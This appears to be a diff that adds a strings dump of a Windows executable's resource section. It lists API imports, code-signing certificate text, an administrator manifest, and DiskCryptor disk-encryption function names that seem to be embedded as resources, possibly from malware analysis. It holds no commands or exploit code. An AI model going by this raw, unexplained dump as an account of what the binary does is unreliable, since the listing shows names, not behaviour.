+	.rsrc:4559CA  ZwQueryVolumeInformationFile
+	.rsrc:4559EA  ZwReadFile
+	.rsrc:4559F8  ZwWriteFile
+	.rsrc:455A04  ntoskrnl.exe
+	.rsrc:455A14  KeQueryPerformanceCounter
+	.rsrc:455A30  KeGetCurrentIrql
+	.rsrc:455A44  KfRaiseIrql
+	.rsrc:455A52  KfLowerIrql
+	.rsrc:455A60  ExReleaseFastMutex
+	.rsrc:455A76  ExAcquireFastMutex
+	.rsrc:455A8C  KeReleaseInStackQueuedSpinLock
+	.rsrc:455AAE  KeAcquireInStackQueuedSpinLock
+	.rsrc:455ACE  HAL.dll
+	.rsrc:455AD8  FltGetInstanceContext
+	.rsrc:455AF0  FltDeleteInstanceContext
+	.rsrc:455B0C  FltSetInstanceContext
+	.rsrc:455B24  FltCreateFile
+	.rsrc:455B34  FltReissueSynchronousIo
+	.rsrc:455B4E  FltQueryInformationFile
+	.rsrc:455B68  FltReleaseContext
+	.rsrc:455B7C  FltClose
+	.rsrc:455B88  FltAllocateContext
+	.rsrc:455B9E  FltUnregisterFilter
+	.rsrc:455BB4  FltGetVolumeName
+	.rsrc:455BC8  FltRegisterFilter
+	.rsrc:455BDC  FltStartFiltering
+	.rsrc:455BEE  FLTMGR.SYS
+	.rsrc:455BFC  memset
+	.rsrc:455C06  _allmul
+	.rsrc:455C10  _except_handler3
+	.rsrc:455C24  memcpy
+	.rsrc:455C2E  _alldiv
+	.rsrc:455C38  _aulldiv
+
+	.rsrc:457C36  Western Cape1
+	.rsrc:457C4D  Durbanville1
+	.rsrc:457C63  Thawte1
+	.rsrc:457C74  Thawte Certification1
+	.rsrc:457C93  Thawte Timestamping CA0
+	.rsrc:457CAD  121221000000Z
+	.rsrc:457CBC  201230235959Z0^1
+	.rsrc:457CE3  Symantec Corporation100.
+	.rsrc:457D01  'Symantec Time Stamping Services CA - G20
+	.rsrc:457D58  "W*o
+	.rsrc:457E37  ]jxdE
+	.rsrc:457E3D  `F~T
+	.rsrc:457E81  &0$0"
+	.rsrc:457E92  http://ocsp.thawte.com0
+	.rsrc:457EC4  80604
+	.rsrc:457ECE  .http://crl.thawte.com/ThawteTimestampingCA.crl0
+	.rsrc:457F3C  TimeStamp-2048-10
+	.rsrc:457FB8  y@b%
+	.rsrc:458027  Symantec Corporation100.
+	.rsrc:458045  'Symantec Time Stamping Services CA - G20
+	.rsrc:458071  121018000000Z
+	.rsrc:458080  201229235959Z0b1
+	.rsrc:4580A7  Symantec Corporation1402
+	.rsrc:4580C5  +Symantec Time Stamping Services Signer - G40
+	.rsrc:458166  2oNW
+	.rsrc:458189  a;EQ
+	.rsrc:458262  g0e0*
+	.rsrc:458273  http://ts-ocsp.ws.symantec.com07
+	.rsrc:45829E  +http://ts-aia.ws.symantec.com/tss-ca-g2.cer0<
+	.rsrc:4582D2  50301
+	.rsrc:4582DC  +http://ts-crl.ws.symantec.com/tss-ca-g2.crl0(
+	.rsrc:458322  TimeStamp-2048-20
+	
+	.rsrc:4584CF  VeriSign, Inc.1
+	.rsrc:4584E8  VeriSign Trust Network1;09
+	.rsrc:458508  2Terms of use at https://www.verisign.com/rpa (c)101.0,
+	.rsrc:458545  %VeriSign Class 3 Code Signing 2010 CA0
+	.rsrc:45856F  131122000000Z
+	.rsrc:45857E  151203235959Z0
+	.rsrc:4585A6  Russia1
+	.rsrc:4585B7  Moscow1
+	.rsrc:4585C8  ReactOS Foundation1>0<
+	.rsrc:4585E4  5Digital ID Class 3 - Microsoft Software Validation v21
+	.rsrc:458625  ReactOS Foundation0
+	.rsrc:458792  /http://csc3-2010-crl.verisign.com/CSC3-2010.crl0D
+	.rsrc:4587EC  https://www.verisign.com/rpa0
+	.rsrc:45882A  e0c0$
+	.rsrc:45883B  http://ocsp.verisign.com0;
+	.rsrc:458860  /http://csc3-2010-aia.verisign.com/CSC3-2010.cer0
+	.rsrc:458A32  Washington1
+	.rsrc:458A47  Redmond1
+	.rsrc:458A59  Microsoft Corporation1)0'
+	.rsrc:458A78   Microsoft Code Verification Root0
+	.rsrc:458A9D  110222192517Z
+	.rsrc:458AAC  210222193517Z0
+	.rsrc:458AD4  VeriSign, Inc.1
+	.rsrc:458AED  VeriSign Trust Network1:08
+	.rsrc:458B0D  1(c) 2006 VeriSign, Inc. - For authorized use only1E0C
+	.rsrc:458B49  <VeriSign Class 3 Public Primary Certification Authority - G50
+	.rsrc:458D35  Dhttp://crl.microsoft.com/pki/crl/products/MicrosoftCodeVerifRoot.crl0
+	.rsrc:458F3F  wha3
+	.rsrc:458F4D  \J$jg
+	.rsrc:458FD7  VeriSign, Inc.1
+	.rsrc:458FF0  VeriSign Trust Network1:08
+	.rsrc:459010  1(c) 2006 VeriSign, Inc. - For authorized use only1E0C
+	.rsrc:45904C  <VeriSign Class 3 Public Primary Certification Authority - G50
+	.rsrc:45908D  100208000000Z
+	.rsrc:45909C  200207235959Z0
+	.rsrc:4590C4  VeriSign, Inc.1
+	.rsrc:4590DD  VeriSign Trust Network1;09
+	.rsrc:4590FD  2Terms of use at https://www.verisign.com/rpa (c)101.0,
+	.rsrc:45913A  %VeriSign Class 3 Code Signing 2010 CA0
+	.rsrc:4592CC  https://www.verisign.com/cps0*
+	.rsrc:4592F8  https://www.verisign.com/rpa0
+	.rsrc:459340  image/gif0!0
+	.rsrc:45936F  #http://logo.verisign.com/vslogo.gif04
+	.rsrc:4593A5  #http://crl.verisign.com/pca3-g5.crl04
+	.rsrc:4593E7  http://ocsp.verisign.com0
+	.rsrc:459438  VeriSignMPKI-2-80
+	.rsrc:459523  B=e6
+	.rsrc:4595C5  VeriSign, Inc.1
+	.rsrc:4595DE  VeriSign Trust Network1;09
+	.rsrc:4595FE  2Terms of use at https://www.verisign.com/rpa (c)101.0,
+	.rsrc:45963B  %VeriSign Class 3 Code Signing 2010 CA
+	.rsrc:45983D  Symantec Corporation100.
+	.rsrc:45985B  'Symantec Time Stamping Services CA - G2
+
+	.rsrc:463677  WhDZA
+	.rsrc:46369A  WhLZA
+	.rsrc:4636BA  PhTZA
+	.rsrc:4639CE  &&&&&
+	.rsrc:4639D5  &&&&&&&&&&&
+	.rsrc:4639E9  &&&&
+	.rsrc:4639EF  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+	.rsrc:463A1E  &&&&&&&&&&&&
+	.rsrc:463A30  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+	.rsrc:463A52  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+	.rsrc:463A80   &&&&&&&&&&&&&&&&&&&&&&&&&&!"#$%W
+
+	.rsrc:4705DE  ImageList_Draw
+	.rsrc:4705F0  ImageList_GetIconSize
+	.rsrc:470608  ImageList_DrawEx
+	.rsrc:47061C  ImageList_Add
+	.rsrc:47062C  ImageList_Create
+	.rsrc:47063E  COMCTL32.dll
+	.rsrc:47064E  PathFileExistsW
+	.rsrc:47065E  SHLWAPI.dll
+	.rsrc:47066C  NtQueryInformationProcess
+	.rsrc:470686  ntdll.dll
+	.rsrc:470692  CreateProcessW
+	.rsrc:4706A4  GetCurrentProcess
+	.rsrc:4706B8  WaitForSingleObject
+	.rsrc:4706CE  OpenProcess
+	.rsrc:4706DC  Sleep
+	.rsrc:4706E4  GetModuleFileNameW
+	.rsrc:4706FA  CloseHandle
+	.rsrc:470708  GetLogicalDrives
+	.rsrc:47071C  SetVolumeMountPointW
+	.rsrc:470734  LeaveCriticalSection
+	.rsrc:47074C  ReadFile
+	.rsrc:470758  CreateFileW
+	.rsrc:470766  EnterCriticalSection
+	.rsrc:47077E  GetVolumeInformationW
+	.rsrc:470796  InitializeCriticalSection
+	.rsrc:4707B2  GlobalFindAtomW
+	.rsrc:4707C4  GetModuleHandleA
+	.rsrc:4707D8  GetFileSize
+	.rsrc:4707E6  ExitProcess
+	.rsrc:4707F4  DeleteVolumeMountPointW
+	.rsrc:47080E  GetCurrentThreadId
+	.rsrc:470824  SetThreadPriority
+	.rsrc:470838  SuspendThread
+	.rsrc:470848  ResumeThread
+	.rsrc:470858  CreateThread
+	.rsrc:470868  GetSystemTimeAsFileTime
+	.rsrc:470882  FileTimeToSystemTime
+	.rsrc:47089A  FindResourceW
+	.rsrc:4708AA  LoadResource
+	.rsrc:4708BA  SizeofResource
+	.rsrc:4708CC  LockResource
+	.rsrc:4708DC  LoadLibraryW
+	.rsrc:4708EA  KERNEL32.dll
+	.rsrc:4708FA  MoveWindow
+	.rsrc:470908  SendMessageW
+	.rsrc:470918  GetSystemMetrics
+	.rsrc:47092C  ShowWindow
+	.rsrc:47093A  SetWindowPos
+	.rsrc:47094A  GetWindowLongW
+	.rsrc:47095C  InvalidateRect
+	.rsrc:47096E  GetClientRect
+	.rsrc:47097E  GetWindowInfo
+	.rsrc:47098E  GetParent
+	.rsrc:47099A  GetWindowRect
+	.rsrc:4709AA  ScreenToClient
+	.rsrc:4709BC  EnableWindow
+	.rsrc:4709CC  GetSysColor
+	.rsrc:4709DA  GetDlgItem
+	.rsrc:4709E8  EnableMenuItem
+	.rsrc:4709FA  GetMenu
+	.rsrc:470A04  SetWindowTextW
+	.rsrc:470A16  MessageBoxW
+	.rsrc:470A24  GetMenuItemCount
+	.rsrc:470A38  GetWindowTextW
+	.rsrc:470A4A  IsWindowEnabled
+	.rsrc:470A5C  DialogBoxParamW
+	.rsrc:470A6E  RegisterHotKey
+	.rsrc:470A80  UnregisterHotKey
+	.rsrc:470A94  DispatchMessageW
+	.rsrc:470AA8  RegisterClassW
+	.rsrc:470ABA  CreateDialogParamW
+	.rsrc:470AD0  LoadIconW
+	.rsrc:470ADC  LoadAcceleratorsW
+	.rsrc:470AF0  TranslateMessage
+	.rsrc:470B04  FindWindowW
+	.rsrc:470B12  SetForegroundWindow
+	.rsrc:470B28  DefDlgProcW
+	.rsrc:470B36  KillTimer
+	.rsrc:470B42  GetMessageW
+	.rsrc:470B50  SetTimer
+	.rsrc:470B5C  DestroyAcceleratorTable
+	.rsrc:470B76  TranslateAcceleratorW
+	.rsrc:470B8E  CallWindowProcW
+	.rsrc:470BA0  DestroyIcon
+	.rsrc:470BAE  IsWindowVisible
+	.rsrc:470BC0  EndDialog
+	.rsrc:470BCC  SetWindowLongW
+	.rsrc:470BDE  ReleaseDC
+	.rsrc:470BEA  LookupIconIdFromDirectoryEx
+	.rsrc:470C08  GetDC
+	.rsrc:470C10  SetFocus
+	.rsrc:470C1C  CreateIconFromResourceEx
+	.rsrc:470C38  TrackMouseEvent
+	.rsrc:470C4A  SetCursor
+	.rsrc:470C56  GetMessagePos
+	.rsrc:470C66  DestroyMenu
+	.rsrc:470C74  SetWindowTextA
+	.rsrc:470C86  CreatePopupMenu
+	.rsrc:470C98  AppendMenuW
+	.rsrc:470CA6  GetWindowTextA
+	.rsrc:470CB8  TrackPopupMenu
+	.rsrc:470CCA  SetMenuItemInfoW
+	.rsrc:470CDE  GetCursorPos
+	.rsrc:470CEE  GetFocus
+	.rsrc:470CFA  PostQuitMessage
+	.rsrc:470D0C  MapDialogRect
+	.rsrc:470D1C  GetNextDlgTabItem
+	.rsrc:470D30  SetWindowsHookExW
+	.rsrc:470D44  CallNextHookEx
+	.rsrc:470D56  UnhookWindowsHookEx
+	.rsrc:470D6C  EnumChildWindows
+	.rsrc:470D80  DestroyWindow
+	.rsrc:470D90  ExitWindowsEx
+	.rsrc:470DA0  GetDialogBaseUnits
+	.rsrc:470DB6  DrawStateW
+	.rsrc:470DC4  DrawFocusRect
+	.rsrc:470DD4  DrawEdge
+	.rsrc:470DE0  DrawTextExW
+	.rsrc:470DEE  FillRect
+	.rsrc:470DFA  LoadBitmapW
+	.rsrc:470E08  GetClassNameW
+	.rsrc:470E18  LoadCursorW
+	.rsrc:470E26  GetKeyState
+	.rsrc:470E32  USER32.dll
+	.rsrc:470E40  GetStockObject
+	.rsrc:470E52  SetBkMode
+	.rsrc:470E5E  SetDCBrushColor
+	.rsrc:470E70  SelectObject
+	.rsrc:470E80  GetTextExtentPoint32W
+	.rsrc:470E98  SetTextColor
+	.rsrc:470EA8  ExtTextOutW
+	.rsrc:470EB6  SetBkColor
+	.rsrc:470EC4  GetTextMetricsW
+	.rsrc:470ED6  CreateFontIndirectW
+	.rsrc:470EEA  GDI32.dll
+	.rsrc:470EF6  GetOpenFileNameW
+	.rsrc:470F0A  GetSaveFileNameW
+	.rsrc:470F1C  COMDLG32.dll
+	.rsrc:470F2C  RegCreateKeyW
+	.rsrc:470F3C  RegQueryValueExW
+	.rsrc:470F50  RegOpenKeyW
+	.rsrc:470F5E  RegDeleteValueW
+	.rsrc:470F70  RegCloseKey
+	.rsrc:470F7E  RegSetValueExW
+	.rsrc:470F8E  ADVAPI32.dll
+	.rsrc:470F9E  ShellExecuteW
+	.rsrc:470FAE  SHBrowseForFolderW
+	.rsrc:470FC4  Shell_NotifyIconW
+	.rsrc:470FD8  SHGetPathFromIDListW
+	.rsrc:470FEE  SHELL32.dll
+	.rsrc:470FFC  is_win_vista
+	.rsrc:47100C  dc_dsk_get_size
+	.rsrc:47101E  dc_get_mbr_config
+	.rsrc:471032  dc_get_boot_device
+	.rsrc:471048  dc_format_byte_size
+	.rsrc:47105E  dc_get_boot_disk
+	.rsrc:471072  dc_mbr_config_by_partition
+	.rsrc:471090  secure_free
+	.rsrc:47109E  dc_unmount_all
+	.rsrc:4710B0  save_file
+	.rsrc:4710BC  dc_restore_header
+	.rsrc:4710D0  dc_device_control
+	.rsrc:4710E4  dc_unset_mbr
+	.rsrc:4710F4  dc_change_password
+	.rsrc:47110A  dc_mount_volume
+	.rsrc:47111C  dc_backup_header
+	.rsrc:471130  dc_update_boot
+	.rsrc:471142  dc_done_format
+	.rsrc:471154  dc_set_mbr
+	.rsrc:471162  dc_set_boot
+	.rsrc:471170  dc_make_pxe
+	.rsrc:47117E  dc_get_drive_info
+	.rsrc:471192  dc_mount_all
+	.rsrc:4711A2  dc_get_cipher_name
+	.rsrc:4711B8  dc_unmount_volume
+	.rsrc:4711CC  dc_make_iso
+	.rsrc:4711DA  dc_start_decrypt
+	.rsrc:4711EE  dc_set_mbr_config
+	.rsrc:471202  dc_format_fs
+	.rsrc:471212  dc_benchmark
+	.rsrc:471222  dc_next_volume
+	.rsrc:471234  dc_get_hw_name
+	.rsrc:471246  dc_first_volume
+	.rsrc:471258  dc_remove_driver
+	.rsrc:47126C  dc_load_config
+		
+	.rsrc:47127E  dc_update_driver
+	.rsrc:471292  dc_get_version
+	.rsrc:4712A4  dc_is_driver_works
+	.rsrc:4712BA  rnd_init
+	.rsrc:4712C6  dc_install_driver
+	.rsrc:4712DA  dc_is_old_runned
+	.rsrc:4712EE  dc_is_driver_installed
+	.rsrc:471308  is_wow64
+	.rsrc:471314  is_admin
+	.rsrc:471320  dc_open_device
+	.rsrc:471332  secure_alloc
+	.rsrc:471342  dc_add_keyfiles
+	.rsrc:471354  rnd_reseed_now
+	.rsrc:471366  dc_encrypt_iso_image
+	.rsrc:47137E  dc_get_bsod
+	.rsrc:47138C  dc_save_config
+	.rsrc:47139E  load_file
+	.rsrc:4713AA  dc_start_encrypt
+	.rsrc:4713BE  dc_start_format
+	.rsrc:4713D0  dc_start_re_encrypt
+	.rsrc:4713E6  dc_get_device_status
+	.rsrc:4713FE  enable_privilege
+	.rsrc:471412  dc_dec_step
+	.rsrc:471420  dc_sync_enc_state
+	.rsrc:471434  dc_enc_step
+	.rsrc:471442  dc_format_step
+	.rsrc:471454  dc_disk_close
+	.rsrc:471464  dc_disk_open
+	.rsrc:471472  dcapi.dll
+	.rsrc:47147E  _wcslwr
+	.rsrc:471488  wcstoul
+	.rsrc:471492  _snwprintf
+	.rsrc:4714A0  wcsstr
+	.rsrc:4714AA  malloc
+	.rsrc:4714B4  wcsrchr
+	.rsrc:4714BE  free
+	.rsrc:4714C6  qsort
+	.rsrc:4714CE  _ftol
+	.rsrc:4714D6  _snprintf
+	.rsrc:4714E2  wcsncat
+	.rsrc:4714EC  wcsncpy
+	.rsrc:4714F6  wcschr
+	.rsrc:471500  _wtoi
+	.rsrc:471508  _vsnwprintf
+	.rsrc:471514  msvcrt.dll
+	.rsrc:471522  memset
+	.rsrc:47152C  memcpy
+	.rsrc:471536  __wgetmainargs
+	.rsrc:471548  _cexit
+	.rsrc:471552  _exit
+	.rsrc:47155A  _XcptFilter
+	.rsrc:471568  exit
+	.rsrc:471570  _wcmdln
+	.rsrc:47157A  _initterm
+	.rsrc:471586  _amsg_exit
+	.rsrc:471594  __setusermatherr
+	.rsrc:4715A8  __p__commode
+	.rsrc:4715B8  __p__fmode
+	.rsrc:4715C6  __set_app_type
+	.rsrc:4715D8  ?terminate@@YAXXZ
+	.rsrc:4715EC  _controlfp
+	.rsrc:4715FA  RtlUnwin
+	.rsrc:471606  InterlockedExchange
+	.rsrc:47161C  InterlockedCompareExchange
+	.rsrc:47163A  GetStartupInfoW
+	.rsrc:47164C  TerminateProcess
+	.rsrc:471660  UnhandledExceptionFilter
+	.rsrc:47167C  SetUnhandledExceptionFilter
+	.rsrc:47169A  QueryPerformanceCounter
+	.rsrc:4716B4  GetTickCount
+	.rsrc:4716C4  GetCurrentProcessId
+	.rsrc:4716DA  _CIlog
+
+	.rsrc:47D368  <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>
+	
+	.rsrc:48D3B0  Keyfiles not loaded, error %d
+	.rsrc:48D4DC  1.1.846.118
+	.rsrc:48EE02  dc_mbr_config_by_partition
+	.rsrc:48EE20  load_file
+	.rsrc:48EE2C  dc_unset_mbr
+	.rsrc:48EE3C  dc_dsk_get_size
+	.rsrc:48EE4E  dc_get_hw_name
+	.rsrc:48EE60  dc_get_mbr_config
+	.rsrc:48EE74  dc_update_boot
+	.rsrc:48EE86  dc_format_byte_size
+	.rsrc:48EE9C  dc_set_boot
+	.rsrc:48EEAA  dc_make_pxe
+	.rsrc:48EEB8  dc_get_boot_disk
+	.rsrc:48EECC  dc_make_iso
+	.rsrc:48EEDA  dc_set_mbr_config
+	.rsrc:48EEEE  dc_start_encrypt
+	.rsrc:48EF02  dc_load_config
+	.rsrc:48EF14  dc_get_version
+	.rsrc:48EF26  rnd_reseed_now
+	.rsrc:48EF38  secure_free
+	.rsrc:48EF46  dc_next_volume
+	.rsrc:48EF58  dc_unmount_all
+	.rsrc:48EF6A  dc_is_driver_works
+	.rsrc:48EF80  save_file
+	.rsrc:48EF8C  dc_restore_header
+	.rsrc:48EFA0  dc_device_control
+	.rsrc:48EFB4  rnd_init
+	.rsrc:48EFC0  dc_is_old_runned
+	.rsrc:48EFD4  dc_change_password
+	.rsrc:48EFEA  dc_mount_volume
+	.rsrc:48EFFC  dc_backup_header
+	.rsrc:48F010  dc_dec_step
+	.rsrc:48F01E  dc_encrypt_iso_image
+	.rsrc:48F036  dc_get_boot_device
+	.rsrc:48F04C  dc_done_format
+	.rsrc:48F05E  dc_get_device_status
+	.rsrc:48F076  dc_set_mbr
+	.rsrc:48F084  dc_start_format
+	.rsrc:48F096  dc_get_bsod
+	.rsrc:48F0A4  secure_alloc
+	.rsrc:48F0B4  dc_first_volume
+	.rsrc:48F0C6  dc_mount_all
+	.rsrc:48F0D6  dc_start_re_encrypt
+	.rsrc:48F0EC  dc_add_keyfiles
+	.rsrc:48F0FE  dc_get_cipher_name
+	.rsrc:48F114  dc_unmount_volume
+	.rsrc:48F128  dc_add_password
+	.rsrc:48F13A  dc_sync_enc_state
+	.rsrc:48F14E  is_wow64
+	.rsrc:48F15A  dc_start_decrypt
+	.rsrc:48F16E  is_admin
+	.rsrc:48F17A  dc_save_config
+	.rsrc:48F18C  dc_open_device
+	.rsrc:48F19E  dc_enc_step
+	.rsrc:48F1AC  dc_format_fs
+	.rsrc:48F1BC  dc_format_step
+	.rsrc:48F1CE  dc_benchmark
+	.rsrc:48F1DC  dcapi.dll
+	.rsrc:48F1E8  _wcslwr
+	.rsrc:48F1F2  _wtoi
+	.rsrc:48F1FA  _snwprintf
+	.rsrc:48F208  free
+	.rsrc:48F210  __iob_func
+	.rsrc:48F21E  wprintf
+	.rsrc:48F228  fgetws
+	.rsrc:48F232  tolower
+	.rsrc:48F23C  fgets
+	.rsrc:48F244  isdigit
+	.rsrc:48F24E  _getch
+	.rsrc:48F258  wscanf
+	.rsrc:48F262  _wcsicmp
+	.rsrc:48F26E  _putch
+	.rsrc:48F278  qsort
+	.rsrc:48F280  wcsncpy
+	.rsrc:48F28A  printf
+	.rsrc:48F294  _kbhit
+	.rsrc:48F29C  msvcrt.dll
+	.rsrc:48F2AA  memset
+	.rsrc:48F2B4  __wgetmainargs
+	.rsrc:48F2C6  _cexit
+	.rsrc:48F2D0  _exit
+	.rsrc:48F2D8  _XcptFilter
+	.rsrc:48F2E6  exit
+	.rsrc:48F2EE  _initterm
+	.rsrc:48F2FA  _amsg_exit
+	.rsrc:48F308  __setusermatherr
+	.rsrc:48F31C  __p__commode
+	.rsrc:48F32C  __p__fmode
+	.rsrc:48F33A  __set_app_type
+	.rsrc:48F34C  ?terminate@@YAXXZ
+	.rsrc:48F360  _controlfp
+	.rsrc:48F36E  Sleep
+	.rsrc:48F376  GetCommandLineW
+	.rsrc:48F388  GetCommandLineA
+	.rsrc:48F39A  SetConsoleCursorPosition
+	.rsrc:48F3B6  GetStdHandle
+	.rsrc:48F3C6  FillConsoleOutputCharacterW
+	.rsrc:48F3E4  GetConsoleScreenBufferInfo
+	.rsrc:48F402  SetVolumeMountPointW
+	.rsrc:48F41A  RtlUnwind
+	.rsrc:48F426  InterlockedExchange
+	.rsrc:48F43C  InterlockedCompareExchange
+	.rsrc:48F45A  TerminateProcess
+	.rsrc:48F46E  GetCurrentProcess
+	.rsrc:48F482  UnhandledExceptionFilter
+	.rsrc:48F49E  SetUnhandledExceptionFilter
+	.rsrc:48F4BC  GetModuleHandleA
+	.rsrc:48F4D0  QueryPerformanceCounter
+	.rsrc:48F4EA  GetTickCount
+	.rsrc:48F4FA  GetCurrentThreadId
+	.rsrc:48F510  GetCurrentProcessId
+	.rsrc:48F526  GetSystemTimeAsFileTime
+	.rsrc:48F53E  KERNEL32.dll
+	
+	.rsrc:4B57F4  CD001
+	.rsrc:4B57FC  DiskCryptor boot disk           
+	.rsrc:4B5820  EL TORITO SPECIFICATION
+	.rsrc:4B596C  IsWow64Process
+	.rsrc:4B597C  kernel32
+	.rsrc:4B5988  NTFS    
+	.rsrc:4B5994  FAT12   
+	.rsrc:4B59A0  FAT16   
+	.rsrc:4B59AC  FAT32   
+	.rsrc:4B59B8  EXFAT   
+	.rsrc:4B5A40  Format
+	.rsrc:4B5A5C  MbP?H
+	.rsrc:4B5DF6  GetOpenClipboardWindow
+	.rsrc:4B5E10  GetShellWindow
+	.rsrc:4B5E22  GetWindowThreadProcessId
+	.rsrc:4B5E3E  GetMessageTime
+	.rsrc:4B5E50  GetClipboardOwner
+	.rsrc:4B5E64  SetWindowsHookExW
+	.rsrc:4B5E78  GetCursor
+	.rsrc:4B5E84  GetActiveWindow
+	.rsrc:4B5E96  GetCaretPos
+	.rsrc:4B5EA4  GetDesktopWindow
+	.rsrc:4B5EB8  GetWindowTextW
+	.rsrc:4B5ECA  GetInputState
+	.rsrc:4B5EDA  GetCursorInfo
+	.rsrc:4B5EEA  GetGUIThreadInfo
+	.rsrc:4B5EFE  GetForegroundWindow
+	.rsrc:4B5F14  GetKBCodePage
+	.rsrc:4B5F24  GetCapture
+	.rsrc:4B5F32  GetQueueStatus
+	.rsrc:4B5F44  EnumWindows
+	.rsrc:4B5F52  GetClientRect
+	.rsrc:4B5F62  GetWindowInfo
+	.rsrc:4B5F72  CallNextHookEx
+	.rsrc:4B5F84  GetFocus
+	.rsrc:4B5F90  GetLastActivePopup
+	.rsrc:4B5FA6  GetWindowRect
+	.rsrc:4B5FB4  USER32.dll
+	.rsrc:4B5FC2  CreateServiceW
+	.rsrc:4B5FD4  CloseServiceHandle
+	.rsrc:4B5FEA  DeleteService
+	.rsrc:4B5FFA  OpenSCManagerW
+	.rsrc:4B600C  OpenServiceW
+	.rsrc:4B601C  RegCreateKeyW
+	.rsrc:4B602C  RegQueryValueExW
+	.rsrc:4B6040  RegOpenKeyW
+	.rsrc:4B604E  RegDeleteValueW
+	.rsrc:4B6060  RegFlushKey
+	.rsrc:4B606E  RegCloseKey
+	.rsrc:4B607C  RegSetValueExW
+	.rsrc:4B608E  OpenProcessToken
+	.rsrc:4B60A2  LookupPrivilegeValueW
+	.rsrc:4B60BA  AllocateAndInitializeSid
+	.rsrc:4B60D6  FreeSid
+	.rsrc:4B60E0  CheckTokenMembership
+	.rsrc:4B60F8  AdjustTokenPrivileges
+	.rsrc:4B6110  CryptAcquireContextW
+	.rsrc:4B6128  CryptReleaseContext
+	.rsrc:4B613E  CryptGenRandom
+	.rsrc:4B614E  ADVAPI32.dll
+	.rsrc:4B615E  GetProcessMemoryInfo
+	.rsrc:4B6174  PSAPI.DLL
+	.rsrc:4B6180  mbstowcs
+	.rsrc:4B618C  _snwprintf
+	.rsrc:4B619A  isspace
+	.rsrc:4B61A4  tolower
+	.rsrc:4B61AE  isprint
+	.rsrc:4B61B8  wcschr
+	.rsrc:4B61C2  memmove
+	.rsrc:4B61CC  wcsrchr
+	.rsrc:4B61D6  _vsnwprintf
+	.rsrc:4B61E4  free
+	.rsrc:4B61EC  calloc
+	.rsrc:4B61F6  malloc
+	.rsrc:4B6200  wcsncpy
+	.rsrc:4B6208  msvcrt.dll
+	.rsrc:4B6216  memset
+	.rsrc:4B6220  memcpy
+	.rsrc:4B622A  _XcptFilter
+	.rsrc:4B6238  _initterm
+	.rsrc:4B6244  _amsg_exit
+	.rsrc:4B6252  VirtualFree
+	.rsrc:4B6260  WriteFile
+	.rsrc:4B626C  ReadFile
+	.rsrc:4B6278  CreateFileW
+	.rsrc:4B6286  GetFileSizeEx
+	.rsrc:4B6296  GetLastError
+	.rsrc:4B62A6  VirtualAlloc
+	.rsrc:4B62B6  CloseHandle
+	.rsrc:4B62C4  DeleteFileW
+	.rsrc:4B62D2  CreateMutexW
+	.rsrc:4B62E2  TlsGetValue
+	.rsrc:4B62F0  FindResourceW
+	.rsrc:4B6300  LoadResource
+	.rsrc:4B6310  SizeofResource
+	.rsrc:4B6322  LockResource
+	.rsrc:4B6332  TlsAlloc
+	.rsrc:4B633E  TlsFree
+	.rsrc:4B6348  DeviceIoControl
+	.rsrc:4B635A  FindVolumeClose
+	.rsrc:4B636C  TlsSetValue
+	.rsrc:4B637A  DeleteVolumeMountPointW
+	.rsrc:4B6394  FindNextVolumeW
+	.rsrc:4B63A6  FindFirstVolumeW
+	.rsrc:4B63BA  GetSystemDirectoryW
+	.rsrc:4B63D0  CopyFileW
+	.rsrc:4B63DC  GetFileAttributesW
+	.rsrc:4B63F2  GetModuleFileNameW
+	.rsrc:4B6408  GetVersion
+	.rsrc:4B6416  GlobalAddAtomW
+	.rsrc:4B6428  FindFirstFileW
+	.rsrc:4B643A  FindClose
+	.rsrc:4B6446  FindNextFileW
+	.rsrc:4B6456  GetFileSize
+	.rsrc:4B6464  SetFilePointer
+	.rsrc:4B6476  SetEndOfFile
+	.rsrc:4B6486  VirtualQuery
+	.rsrc:4B6496  FreeLibrary
+	.rsrc:4B64A4  GetCurrentProcess
+	.rsrc:4B64B8  LoadLibraryW
+	.rsrc:4B64C8  GetVersionExW
+	.rsrc:4B64D8  VirtualUnlock
+	.rsrc:4B64E8  GetProcAddress
+	.rsrc:4B64FA  VirtualLock
+	.rsrc:4B6508  GetModuleHandleA
+	.rsrc:4B651C  QueryPerformanceCounter
+	.rsrc:4B6536  GetTickCount
+	.rsrc:4B6546  GetCurrentThread
+	.rsrc:4B655A  GetProcessHeap
+	.rsrc:4B656C  GetProcessTimes
+	.rsrc:4B657E  GlobalMemoryStatusEx
+	.rsrc:4B6596  GetOEMCP
+	.rsrc:4B65A2  GetCurrentThreadId
+	.rsrc:4B65B8  GetCurrentProcessId
+	.rsrc:4B65CE  GetThreadTimes
+	.rsrc:4B65E0  RtlUnwind
+	.rsrc:4B65EC  InterlockedExchange
+	.rsrc:4B6602  Sleep
+	.rsrc:4B660A  InterlockedCompareExchange
+	.rsrc:4B6628  TerminateProcess
+	.rsrc:4B663C  UnhandledExceptionFilter
+	.rsrc:4B6658  SetUnhandledExceptionFilter
+	.rsrc:4B6676  GetSystemTimeAsFileTime
+	.rsrc:4B668E  KERNEL32.dll
+	.rsrc:4B669E  floor
+	.rsrc:4B66A6  _except_handler3
+	.rsrc:4B697E  dcapi.dll
+	.rsrc:4B6988  dc_add_keyfiles
+	.rsrc:4B6998  dc_add_password
+	.rsrc:4B69A8  dc_backup_header
+	.rsrc:4B69B9  dc_benchmark
+	.rsrc:4B69C6  dc_change_password
+	.rsrc:4B69D9  dc_dec_step
+	.rsrc:4B69E5  dc_device_control
+	.rsrc:4B69F7  dc_disk_close
+	.rsrc:4B6A05  dc_disk_open
+	.rsrc:4B6A12  dc_disk_read
+	.rsrc:4B6A1F  dc_disk_write
+	.rsrc:4B6A2D  dc_done_format
+	.rsrc:4B6A3C  dc_dsk_get_size
+	.rsrc:4B6A4C  dc_enc_step
+	.rsrc:4B6A58  dc_encrypt_iso_image
+	.rsrc:4B6A6D  dc_extract_rsrc
+	.rsrc:4B6A7D  dc_first_volume
+	.rsrc:4B6A8D  dc_format_byte_size
+	.rsrc:4B6AA1  dc_format_fs
+	.rsrc:4B6AAE  dc_format_step
+	.rsrc:4B6ABD  dc_get_boot_device
